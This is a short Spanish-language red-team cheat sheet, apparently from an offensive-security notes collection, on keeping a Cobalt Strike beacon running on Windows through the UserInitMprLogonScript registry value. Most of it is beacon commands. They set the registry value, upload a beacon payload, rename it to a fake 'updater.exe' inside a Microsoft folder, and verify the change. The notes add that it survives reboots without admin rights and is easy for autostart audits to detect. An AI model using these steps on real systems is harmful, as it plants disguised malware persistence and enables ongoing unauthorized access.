---
title: Persistencia — Logon Scripts
tags: [persistence, cobalt-strike, logon-scripts, registry]
---

# Logon Scripts

## Descripción

El valor de registro `UserInitMprLogonScript` en `HKCU\Environment` hace que Windows ejecute el ejecutable especificado cada vez que el usuario inicia sesión.

## Configurar

```
beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\updater.exe
```

## Payload

Subir el payload antes de configurar el registro:

```
beacon> upload C:\Payloads\beacon-http.exe
beacon> mv beacon-http.exe C:\Users\<user>\AppData\Local\Microsoft\updater.exe
```

## Verificar

```
beacon> reg query x64 HKCU\Environment
```

> [!tip] Persiste a través de reboots. Se ejecuta en contexto del usuario (sin privilegios elevados necesarios para la persistencia).

> [!warning] La detección es sencilla — cualquier herramienta de auditoría de autostart revisa `UserInitMprLogonScript`.
